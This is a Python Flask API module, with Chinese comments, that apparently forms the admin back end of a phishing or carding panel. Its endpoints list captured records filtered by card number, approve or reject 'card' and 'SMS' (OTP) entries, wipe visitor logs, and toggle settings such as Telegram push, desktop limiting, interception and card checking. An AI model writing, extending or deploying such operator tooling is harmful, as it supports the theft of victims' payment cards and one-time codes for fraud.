import traceback

from flask import Blueprint, jsonify, request

from models import User, Visit, Setting
from util.authorize import login_required
from util.redis_util import get_settings, set_settings

api = Blueprint("api", __name__, url_prefix="/api/v2")


# 进行中数据
@api.route("/fetch_pending_data", methods=["GET", "OPTION"])
@login_required
def fetch_pending_data():
    try:
        data_list = User.get_pending_data()
        data_list.reverse()
        print(get_settings()["show_filter"])
        if get_settings()["show_filter"] == "1":
            data_list = [x for x in data_list if x["card_number"] is not None]
        data_model = {
            "code": 20000,
            "data": {"items": data_list, "total": len(data_list)},
        }
        return jsonify(data_model)
    except Exception as msg:
        print(msg)
        return "error"


# 已完成数据
@api.route("/fetch_finish_data", methods=["GET", "OPTION"])
@login_required
def fetch_finish_data():
    try:
        data_list = User.get_finish_data()
        data_model = {
            "code": 20000,
            "data": {"items": data_list, "total": len(data_list)},
        }
        return jsonify(data_model)
    except Exception as msg:
        print(msg)
        return "error"


# 设置卡片状态
@api.route("/set_card_status", methods=["GET", "OPTION"])
@login_required
def set_card_status():
    req_data = request.args
    login_info = {
        "id": req_data["id"],
        "status": req_data["status"],
    }
    pass_message = {
        "code": 20000,
        "data": {"message": "Pass"},
    }
    try:
        User.pass_card(login_info)
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 设置短信状态
@api.route("/set_sms_status", methods=["GET", "OPTION"])
@login_required
def set_sms_status():
    req_data = request.args
    login_info = {
        "id": req_data["id"],
        "status": req_data["status"],
    }
    pass_message = {
        "code": 20000,
        "data": {"message": "Pass"},
    }
    try:
        User.pass_otp(login_info)
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 删除数据
@api.route("/delete_data", methods=["POST"])
@login_required
def delete_data():
    delete_id = []
    req_data = request.get_json()["id"]
    for i in req_data:
        delete_id.append(i["id"])
    pass_message = {
        "code": 20000,
        "data": {"message": "Pass"},
    }
    try:
        for i in delete_id:
            User.delete(i)
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 基础数据
@api.route("/base_info", methods=["GET"])
@login_required
def get_base_info():
    try:
        base_info = User.check_data_num()
        pass_message = {
            "code": 20000,
            "data": {"items": base_info},
        }
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 删除访客数据
@api.route("/delet_visit", methods=["GET"])
@login_required
def delet_visit_records():
    try:
        Visit.delete_record()
        pass_message = {
            "code": 20000,
            "data": {"message": "ok"},
        }
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


# 读取设置
@api.route("/fetch_setting", methods=["GET"])
def fetch_setting():
    try:
        setings_dict = Setting.get_data()
        setings_dict["telegram_push"] = bool(int(setings_dict["telegram_push"]))
        setings_dict["limit_desktop"] = bool(int(setings_dict["limit_desktop"]))
        setings_dict["syn"] = bool(int(setings_dict["syn"]))
        setings_dict["intercept"] = bool(int(setings_dict["intercept"]))
        setings_dict["card_check"] = bool(int(setings_dict["card_check"]))
        setings_dict["show_filter"] = bool(int(setings_dict["show_filter"]))
        setings_dict["online_out_time"] = int(setings_dict["online_out_time"])
        pass_message = {
            "code": 20000,
            "data": {"settings": setings_dict},
        }
        return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


@api.route("/set_setting", methods=["POST"])
def set_setting():
    try:
        if request.method == "POST":
            req_data = request.get_json()
            for i in req_data:
                Setting.set_value(i, req_data[i])
            pass_message = {
                "code": 20000,
                "msg": "ok",
            }
            set_settings(Setting.get_data())
            print(get_settings())
            return jsonify(pass_message)
    except Exception as msg:
        error_msg = {
            "code": 40000,
            "data": {"message": "error", "details": msg},
        }
        return jsonify(error_msg)


@api.route("/get_syn", methods=["GET"])
def get_syn():
    try:
        syn_status = Setting.get_syn()
        pass_message = {
            "code": 20000,
            "data": {"status": syn_status},
        }
        return jsonify(pass_message)
    except Exception as msg:
        traceback.print_exc()
        error_msg = {
            "code": 40000,
            "data": {"status": True},
        }
        return jsonify(error_msg)
